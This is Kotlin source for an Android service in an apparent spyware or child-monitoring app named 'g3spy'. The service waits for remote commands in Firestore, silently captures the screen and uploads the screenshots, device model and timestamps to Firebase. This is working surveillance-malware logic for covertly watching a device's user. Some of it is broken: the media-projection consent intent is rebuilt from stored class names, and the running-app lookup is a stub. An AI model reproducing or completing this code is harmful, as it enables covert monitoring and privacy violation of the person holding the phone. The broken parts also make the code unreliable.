package com.g3spy.child

import android.app.Service
import android.content.Intent
import android.content.ComponentName
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.*

class ScreenshotService : Service() {
    private val db = FirebaseFirestore.getInstance()
    private val storage = FirebaseStorage.getInstance()
    private val handler = Handler(Looper.getMainLooper())
    private var lastProcessedCommandId: String? = null
    
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var screenWidth = 0
    private var screenHeight = 0
    private var screenDensity = 0

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        db.collection("remote_commands")
            .whereEqualTo("action", "screenshot")
            .addSnapshotListener { snapshots, error ->
                if (error != null) {
                    return@addSnapshotListener
                }
                
                snapshots?.documents?.forEach { doc ->
                    val commandId = doc.id
                    if (commandId != lastProcessedCommandId) {
                        lastProcessedCommandId = commandId
                        captureAndUploadScreenshot(doc)
                    }
                }
            }
        return START_STICKY
    }
    
    private fun captureAndUploadScreenshot(command: DocumentSnapshot) {
        try {
            
            val bitmap = captureScreenshot()
            
            if (bitmap != null) {
                
                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos)
                val data = baos.toByteArray()
                
                val tempFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                val fos = FileOutputStream(tempFile)
                fos.write(data)
                fos.close()
                
                val storageRef = storage.reference.child("screenshots/${UUID.randomUUID()}.jpg")
                val uploadTask = storageRef.putFile(android.net.Uri.fromFile(tempFile))
                
                uploadTask.continueWithTask { task ->
                    if (!task.isSuccessful) {
                        task.exception?.let { throw it }
                    }
                    storageRef.downloadUrl
                }.addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        val downloadUrl = task.result.toString()
                        
                        val screenshotData = hashMapOf(
                            "url" to downloadUrl,
                            "timestamp" to com.google.firebase.Timestamp.now(),
                            "deviceId" to android.os.Build.MODEL,
                            "appName" to getRunningApp()
                        )
                        
                        db.collection("screenshots").add(screenshotData)
                        
                        tempFile.delete()
                    }
                }
            }
        } catch (e: Exception) {
            val errorData = hashMapOf(
                "error" to e.message,
                "timestamp" to com.google.firebase.Timestamp.now(),
                "type" to "screenshot_error"
            )
            db.collection("errors").add(errorData)
        }
    }
    
    private fun setupMediaProjection() {
        try {
            
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            wm.defaultDisplay.getMetrics(metrics)
            screenWidth = metrics.widthPixels
            screenHeight = metrics.heightPixels
            screenDensity = metrics.densityDpi
            
            val prefs = getSharedPreferences("g3spy_screenshot_prefs", MODE_PRIVATE)
            val resultCode = prefs.getInt("mediaProjectionResultCode", 0)
            
            mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            
            val intent = Intent()
            val packageName = prefs.getString("mediaProjectionResultDataPackage", null)
            val className = prefs.getString("mediaProjectionResultDataClass", null)
            
            if (packageName != null && className != null) {
                intent.component = ComponentName(packageName, className)
                mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, intent)
            }
        } catch (e: Exception) {
            val errorData = hashMapOf(
                "error" to e.message,
                "timestamp" to com.google.firebase.Timestamp.now(),
                "type" to "media_projection_setup_error"
            )
            db.collection("errors").add(errorData)
        }
    }
    
    private fun captureScreenshot(): Bitmap? {
        
        if (mediaProjection == null) {
            setupMediaProjection()
            if (mediaProjection == null) return null
        }
        
        try {
            
            imageReader = ImageReader.newInstance(
                screenWidth, screenHeight,
                PixelFormat.RGBA_8888, 1
            )
            
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, handler
            )
            
            Thread.sleep(100)
            
            val image = imageReader?.acquireLatestImage()
            
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth
                
                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight, Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                
                image.close()
                virtualDisplay?.release()
                virtualDisplay = null
                
                return bitmap
            }
        } catch (e: Exception) {
            val errorData = hashMapOf(
                "error" to e.message,
                "timestamp" to com.google.firebase.Timestamp.now(),
                "type" to "screenshot_capture_error"
            )
            db.collection("errors").add(errorData)
        } finally {
            imageReader?.close()
            imageReader = null
        }
        
        return null
    }
    
    private fun getRunningApp(): String {
        
        return "Current App"
    }

    override fun onBind(intent: Intent?): IBinder? = null
}